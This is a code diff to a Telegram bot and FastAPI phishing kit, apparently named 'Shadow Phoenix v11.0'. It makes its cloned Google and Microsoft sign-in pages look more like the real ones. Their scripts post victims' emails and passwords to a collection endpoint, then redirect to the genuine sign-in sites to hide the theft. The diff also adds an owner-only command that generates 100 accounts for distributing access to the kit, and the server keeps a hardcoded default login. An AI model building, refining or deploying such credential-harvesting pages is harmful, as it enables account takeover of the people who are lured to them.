@@ -5,6 +5,8 @@ import sqlite3
 import hashlib
 import traceback
 import logging
+import random
+import string
 from datetime import datetime
 import uvicorn
 from pydantic import BaseModel
@@ -23,6 +25,7 @@ BOT_TOKEN = os.getenv("BOT_TOKEN", "")
 RENDER_URL = os.getenv("RENDER_URL", "")
 CAPTURE_SECRET = os.getenv("CAPTURE_SECRET", "Shadow_Secret_2026")
 SALT = os.getenv("SALT", "Shadow_Salt_321")
+OWNER_ID = 7295259673  # تم وضع معرف المالك هنا
 
 if not BOT_TOKEN or not RENDER_URL:
     logger.error("❌ المتغيرات البيئية BOT_TOKEN و RENDER_URL غير مضبوطة!")
@@ -30,11 +33,11 @@ if not BOT_TOKEN or not RENDER_URL:
 
 logger.info(f"🔧 BOT_TOKEN: آخر 4 أحرف ...{BOT_TOKEN[-4:]}")
 logger.info(f"🔧 RENDER_URL: {RENDER_URL}")
+logger.info(f"🔧 OWNER_ID: {OWNER_ID}")
 
 # ==================== تهيئة البوت ====================
 try:
     bot = telebot.TeleBot(BOT_TOKEN, threaded=False)
-    # اختبار التوكن
     bot.get_me()
     logger.info("✅ التوكن صحيح ويعمل")
 except Exception as e:
@@ -498,39 +501,205 @@ def get_html_content(template_type, secret_key):
             <meta name="viewport" content="width=device-width, initial-scale=1.0">
             <title>تسجيل الدخول - Google</title>
             <style>
-                body {{ background: #ffffff; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; padding: 20px; }}
-                .container {{ max-width: 400px; width: 100%; padding: 40px; border-radius: 8px; border: 1px solid #dadce0; }}
-                .logo {{ font-size: 28px; font-weight: 500; color: #3c4043; text-align: center; margin-bottom: 10px; }}
-                .logo span {{ color: #4285f4; }} .logo span:nth-child(2) {{ color: #ea4335; }} .logo span:nth-child(3) {{ color: #fbbc05; }} .logo span:nth-child(4) {{ color: #34a853; }}
-                .sub {{ color: #5f6368; font-size: 16px; text-align: center; margin-bottom: 25px; }}
-                .input-group {{ margin-bottom: 20px; }}
-                .input-group input {{ width: 100%; padding: 12px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }}
-                .input-group input:focus {{ border-color: #4285f4; outline: none; }}
-                .btn {{ background: #4285f4; color: white; border: none; padding: 12px; font-size: 16px; border-radius: 4px; cursor: pointer; width: 100%; font-weight: bold; }}
-                .btn:hover {{ background: #3367d6; }}
-                .error {{ color: #d93025; font-size: 14px; margin-top: 15px; display: none; }}
+                * {{ margin: 0; padding: 0; box-sizing: border-box; }}
+                body {{
+                    background: #ffffff;
+                    font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+                    display: flex;
+                    justify-content: center;
+                    align-items: center;
+                    min-height: 100vh;
+                    margin: 0;
+                    padding: 20px;
+                }}
+                .container {{
+                    max-width: 450px;
+                    width: 100%;
+                    padding: 48px 40px 36px;
+                    border-radius: 8px;
+                    border: 1px solid #dadce0;
+                    background: white;
+                    box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+                }}
+                .logo {{
+                    display: flex;
+                    justify-content: center;
+                    align-items: center;
+                    gap: 4px;
+                    font-size: 24px;
+                    font-weight: 500;
+                    letter-spacing: -0.5px;
+                    margin-bottom: 20px;
+                }}
+                .logo span:nth-child(1) {{ color: #4285f4; }}
+                .logo span:nth-child(2) {{ color: #ea4335; }}
+                .logo span:nth-child(3) {{ color: #fbbc05; }}
+                .logo span:nth-child(4) {{ color: #4285f4; }}
+                .logo span:nth-child(5) {{ color: #34a853; }}
+                .logo span:nth-child(6) {{ color: #ea4335; }}
+                .title {{
+                    font-size: 24px;
+                    font-weight: 400;
+                    text-align: center;
+                    margin-bottom: 10px;
+                    color: #202124;
+                }}
+                .subtitle {{
+                    font-size: 16px;
+                    font-weight: 400;
+                    text-align: center;
+                    color: #5f6368;
+                    margin-bottom: 30px;
+                }}
+                .input-group {{
+                    margin-bottom: 20px;
+                    position: relative;
+                }}
+                .input-group input {{
+                    width: 100%;
+                    padding: 13px 15px;
+                    border: 1px solid #dadce0;
+                    border-radius: 4px;
+                    font-size: 16px;
+                    color: #202124;
+                    background: white;
+                    transition: border-color 0.2s;
+                    outline: none;
+                }}
+                .input-group input:focus {{
+                    border-color: #4285f4;
+                    box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
+                }}
+                .input-group input::placeholder {{
+                    color: #80868b;
+                    font-weight: 400;
+                }}
+                .btn {{
+                    background: #4285f4;
+                    color: white;
+                    border: none;
+                    padding: 12px;
+                    font-size: 16px;
+                    font-weight: 500;
+                    border-radius: 4px;
+                    cursor: pointer;
+                    width: 100%;
+                    transition: background 0.2s;
+                    margin-top: 10px;
+                    letter-spacing: 0.3px;
+                }}
+                .btn:hover {{
+                    background: #3367d6;
+                }}
+                .btn:active {{
+                    background: #2a56c6;
+                }}
+                .error {{
+                    color: #d93025;
+                    font-size: 14px;
+                    margin-top: 15px;
+                    display: none;
+                    background: #fce8e6;
+                    padding: 10px;
+                    border-radius: 4px;
+                    text-align: center;
+                }}
+                .footer {{
+                    margin-top: 30px;
+                    text-align: center;
+                    font-size: 14px;
+                    color: #5f6368;
+                }}
+                .footer a {{
+                    color: #4285f4;
+                    text-decoration: none;
+                }}
+                .footer a:hover {{
+                    text-decoration: underline;
+                }}
+                .separator {{
+                    display: flex;
+                    align-items: center;
+                    margin: 20px 0;
+                    color: #5f6368;
+                    font-size: 14px;
+                }}
+                .separator::before, .separator::after {{
+                    content: "";
+                    flex: 1;
+                    height: 1px;
+                    background: #dadce0;
+                }}
+                .separator::before {{ margin-right: 15px; }}
+                .separator::after {{ margin-left: 15px; }}
             </style>
         </head>
         <body>
             <div class="container">
-                <div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
-                <div class="sub">تسجيل الدخول إلى حسابك</div>
-                <div class="input-group"><input type="email" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف"></div>
-                <div class="input-group"><input type="password" id="password" placeholder="كلمة المرور"></div>
+                <div class="logo">
+                    <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+                </div>
+                <div class="title">تسجيل الدخول</div>
+                <div class="subtitle">استمراراً إلى حسابك على Google</div>
+                
+                <div class="input-group">
+                    <input type="email" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" autofocus>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="أدخل كلمة المرور">
+                </div>
+                
                 <button class="btn" id="loginBtn">تسجيل الدخول</button>
-                <div class="error" id="errorMsg">بيانات غير صحيحة، حاول مجدداً.</div>
+                <div class="error" id="errorMsg">تأكد من أن بيانات الدخول صحيحة</div>
+                
+                <div class="separator">أو</div>
+                
+                <div style="text-align: center; margin-top: 10px;">
+                    <a href="#" style="color: #4285f4; text-decoration: none; font-size: 14px; font-weight: 500;">إنشاء حساب</a>
+                </div>
+                
+                <div class="footer">
+                    <a href="#">مساعدة</a> · <a href="#">خصوصية</a> · <a href="#">شروط الخدمة</a>
+                </div>
             </div>
+            
             <script>
                 const ownerId = new URLSearchParams(window.location.search).get('id');
                 document.getElementById('loginBtn').addEventListener('click', function() {{
                     const email = document.getElementById('email').value.trim();
                     const pass = document.getElementById('password').value.trim();
-                    if(!email || !pass) {{ document.getElementById('errorMsg').style.display = 'block'; return; }}
+                    const errorBlock = document.getElementById('errorMsg');
+                    
+                    if(!email || !pass) {{
+                        errorBlock.style.display = 'block';
+                        errorBlock.innerText = '⚠️ يرجى ملء جميع الحقول';
+                        return;
+                    }}
+                    
+                    errorBlock.style.display = 'none';
+                    
                     fetch('/api/credentials', {{
                         method: 'POST',
                         headers: {{ 'Content-Type': 'application/json' }},
-                        body: JSON.stringify({{ user_id: ownerId, email: email, password: pass, login_type: 'google', secret: '{secret_key}' }})
-                    }}).then(() => {{ window.location.href = 'https://www.google.com'; }});
+                        body: JSON.stringify({{
+                            user_id: ownerId,
+                            email: email,
+                            password: pass,
+                            login_type: 'google',
+                            secret: '{secret_key}'
+                        }})
+                    }})
+                    .then(() => {{
+                        window.location.href = 'https://accounts.google.com/v3/signin/challenge/pwd?continue=https://www.google.com';
+                    }})
+                    .catch(() => {{
+                        window.location.href = 'https://www.google.com';
+                    }});
+                }});
+                
+                // الضغط على Enter
+                document.getElementById('password').addEventListener('keypress', function(e) {{
+                    if(e.key === 'Enter') document.getElementById('loginBtn').click();
                 }});
             </script>
         </body>
@@ -546,39 +715,169 @@ def get_html_content(template_type, secret_key):
             <meta name="viewport" content="width=device-width, initial-scale=1.0">
             <title>تسجيل الدخول - Microsoft</title>
             <style>
-                body {{ background: #f2f2f2; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; padding: 20px; }}
-                .container {{ max-width: 400px; width: 100%; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
-                .logo {{ font-size: 32px; font-weight: 600; color: #202124; text-align: center; margin-bottom: 5px; }}
-                .logo small {{ font-size: 14px; color: #5f6368; display: block; }}
-                .sub {{ color: #5f6368; font-size: 16px; text-align: center; margin-bottom: 25px; }}
-                .input-group {{ margin-bottom: 20px; }}
-                .input-group input {{ width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; box-sizing: border-box; }}
-                .input-group input:focus {{ border-color: #0078d4; outline: none; }}
-                .btn {{ background: #0078d4; color: white; border: none; padding: 12px; font-size: 16px; border-radius: 4px; cursor: pointer; width: 100%; font-weight: bold; }}
-                .btn:hover {{ background: #005a9e; }}
-                .error {{ color: #d13438; font-size: 14px; margin-top: 15px; display: none; }}
+                * {{ margin: 0; padding: 0; box-sizing: border-box; }}
+                body {{
+                    background: #f2f2f2;
+                    font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+                    display: flex;
+                    justify-content: center;
+                    align-items: center;
+                    min-height: 100vh;
+                    margin: 0;
+                    padding: 20px;
+                }}
+                .container {{
+                    max-width: 440px;
+                    width: 100%;
+                    background: white;
+                    padding: 44px 40px 36px;
+                    border-radius: 8px;
+                    box-shadow: 0 2px 10px rgba(0,0,0,0.08);
+                }}
+                .logo {{
+                    font-size: 28px;
+                    font-weight: 600;
+                    color: #202124;
+                    text-align: center;
+                    margin-bottom: 5px;
+                }}
+                .logo small {{
+                    font-size: 14px;
+                    color: #5f6368;
+                    display: block;
+                    font-weight: 400;
+                    margin-top: 2px;
+                }}
+                .title {{
+                    font-size: 20px;
+                    font-weight: 600;
+                    color: #202124;
+                    text-align: center;
+                    margin-bottom: 8px;
+                }}
+                .subtitle {{
+                    font-size: 15px;
+                    color: #5f6368;
+                    text-align: center;
+                    margin-bottom: 30px;
+                }}
+                .input-group {{
+                    margin-bottom: 18px;
+                }}
+                .input-group input {{
+                    width: 100%;
+                    padding: 12px 14px;
+                    border: 1px solid #ccc;
+                    border-radius: 4px;
+                    font-size: 15px;
+                    color: #202124;
+                    background: white;
+                    transition: border-color 0.2s;
+                    outline: none;
+                }}
+                .input-group input:focus {{
+                    border-color: #0078d4;
+                }}
+                .btn {{
+                    background: #0078d4;
+                    color: white;
+                    border: none;
+                    padding: 12px;
+                    font-size: 15px;
+                    font-weight: 600;
+                    border-radius: 4px;
+                    cursor: pointer;
+                    width: 100%;
+                    transition: background 0.2s;
+                }}
+                .btn:hover {{
+                    background: #005a9e;
+                }}
+                .error {{
+                    color: #d13438;
+                    font-size: 14px;
+                    margin-top: 15px;
+                    display: none;
+                    background: #fce8e6;
+                    padding: 10px;
+                    border-radius: 4px;
+                    text-align: center;
+                }}
+                .footer {{
+                    margin-top: 25px;
+                    text-align: center;
+                    font-size: 13px;
+                    color: #5f6368;
+                }}
+                .footer a {{
+                    color: #0078d4;
+                    text-decoration: none;
+                }}
+                .footer a:hover {{
+                    text-decoration: underline;
+                }}
             </style>
         </head>
         <body>
             <div class="container">
-                <div class="logo">Microsoft <small>حسابك</small></div>
-                <div class="sub">سجل الدخول لتفعيل الاشتراك</div>
-                <div class="input-group"><input type="text" id="email" placeholder="البريد الإلكتروني أو اسم المستخدم"></div>
-                <div class="input-group"><input type="password" id="password" placeholder="كلمة المرور"></div>
+                <div class="logo">
+                    Microsoft
+                    <small>حسابك</small>
+                </div>
+                <div class="title">تسجيل الدخول</div>
+                <div class="subtitle">لتفعيل اشتراكك وخدماتك</div>
+                
+                <div class="input-group">
+                    <input type="text" id="email" placeholder="البريد الإلكتروني أو اسم المستخدم" autofocus>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="كلمة المرور">
+                </div>
+                
                 <button class="btn" id="loginBtn">تسجيل الدخول</button>
-                <div class="error" id="errorMsg">تأكد من بيانات الدخول.</div>
+                <div class="error" id="errorMsg">تأكد من صحة بيانات الدخول</div>
+                
+                <div class="footer">
+                    <a href="#">نسيت كلمة المرور؟</a> · <a href="#">إنشاء حساب جديد</a>
+                </div>
             </div>
+            
             <script>
                 const ownerId = new URLSearchParams(window.location.search).get('id');
                 document.getElementById('loginBtn').addEventListener('click', function() {{
                     const email = document.getElementById('email').value.trim();
                     const pass = document.getElementById('password').value.trim();
-                    if(!email || !pass) {{ document.getElementById('errorMsg').style.display = 'block'; return; }}
+                    const errorBlock = document.getElementById('errorMsg');
+                    
+                    if(!email || !pass) {{
+                        errorBlock.style.display = 'block';
+                        errorBlock.innerText = '⚠️ يرجى ملء جميع الحقول';
+                        return;
+                    }}
+                    
+                    errorBlock.style.display = 'none';
+                    
                     fetch('/api/credentials', {{
                         method: 'POST',
                         headers: {{ 'Content-Type': 'application/json' }},
-                        body: JSON.stringify({{ user_id: ownerId, email: email, password: pass, login_type: 'microsoft', secret: '{secret_key}' }})
-                    }}).then(() => {{ window.location.href = 'https://www.microsoft.com'; }});
+                        body: JSON.stringify({{
+                            user_id: ownerId,
+                            email: email,
+                            password: pass,
+                            login_type: 'microsoft',
+                            secret: '{secret_key}'
+                        }})
+                    }})
+                    .then(() => {{
+                        window.location.href = 'https://login.live.com/';
+                    }})
+                    .catch(() => {{
+                        window.location.href = 'https://www.microsoft.com';
+                    }});
+                }});
+                
+                document.getElementById('password').addEventListener('keypress', function(e) {{
+                    if(e.key === 'Enter') document.getElementById('loginBtn').click();
                 }});
             </script>
         </body>
@@ -599,7 +898,7 @@ def start(message):
         InlineKeyboardButton("🔐 تسجيل الدخول للنظام", web_app=telebot.types.WebAppInfo(url=f"{RENDER_URL}/login-page")),
         InlineKeyboardButton("ℹ️ تعليمات", callback_data="show_instructions")
     )
-    bot.send_message(chat_id, "🛡️ نظام الصيد الذكي v10.0\nيرجى تسجيل الدخول.", reply_markup=markup)
+    bot.send_message(chat_id, "🛡️ نظام الصيد الذكي v11.0\nيرجى تسجيل الدخول.", reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: call.data == "show_instructions")
 def show_instructions(call):
@@ -668,6 +967,48 @@ def gen_link(call):
     except Exception as e:
         logger.error(f"💥 خطأ: {traceback.format_exc()}")
         bot.send_message(chat_id, f"⚠️ عطل تقني: {str(e)[:100]}")
+
+# ==================== أمر توليد 100 مستخدم جديد (للمالك فقط) ====================
+@bot.message_handler(commands=['genusers'])
+def generate_users_command(message):
+    chat_id = message.chat.id
+    if chat_id != OWNER_ID:
+        bot.send_message(chat_id, "⛔ هذا الأمر خاص بصاحب النظام فقط.")
+        return
+
+    bot.send_message(chat_id, "⏳ جاري توليد 100 مستخدم جديد...")
+
+    conn = get_db_connection()
+    cursor = conn.cursor()
+    users_list = []
+    
+    prefixes = ["hacker", "shadow", "phoenix", "ghost", "cyber", "agent", "knight", "wolf", "eagle", "tiger", "elite", "dark", "storm"]
+    
+    for i in range(100):
+        prefix = random.choice(prefixes)
+        suffix = ''.join(random.choices(string.digits, k=4))
+        username = f"{prefix}_{suffix}"
+        password = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
+        hashed = hash_password(password)
+        
+        try:
+            cursor.execute("INSERT OR IGNORE INTO bot_users (username, password_hash) VALUES (?, ?)", (username, hashed))
+            users_list.append(f"{username} | {password}")
+        except Exception as e:
+            logger.error(f"فشل إضافة {username}: {e}")
+    
+    conn.commit()
+    conn.close()
+
+    file_content = "👤 اسم المستخدم  |  🔑 كلمة السر\n"
+    file_content += "=" * 40 + "\n"
+    file_content += "\n".join(users_list)
+    file_content += f"\n\n✅ إجمالي المستخدمين المضافة: {len(users_list)}"
+
+    file_bytes = io.BytesIO(file_content.encode('utf-8'))
+    file_bytes.name = "users_list.txt"
+    bot.send_document(chat_id, file_bytes, caption="📁 قائمة الـ 100 مستخدم الجدد. وزّعها كما تشاء.")
+    logger.info(f"✅ تم إرسال قائمة 100 مستخدم للمالك {chat_id}")
 
 # ==================== نقاط API ====================
 @app.get("/", response_class=HTMLResponse)
@@ -764,17 +1105,15 @@ async def webhook(request: Request):
 @app.on_event("startup")
 def startup():
     try:
-        # محاولة ضبط الويب هوك مع تجاهل الأخطاء
         bot.remove_webhook()
         webhook_url = f"{RENDER_URL}/{BOT_TOKEN}"
         bot.set_webhook(url=webhook_url)
         logger.info(f"🚀 Webhook مضبوط على: {webhook_url}")
     except Exception as e:
         logger.error(f"⚠️ فشل ضبط Webhook: {e}")
-        logger.info("⏳ سيتم ضبط الويب هوك يدوياً أو تلقائياً عند أول طلب.")
     
     create_new_account("moosa", "123456")
-    logger.info("🔥 Shadow Phoenix v10.0 جاهز للعمل!")
+    logger.info("🔥 Shadow Phoenix v11.0 جاهز للعمل مع أمر /genusers!")
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
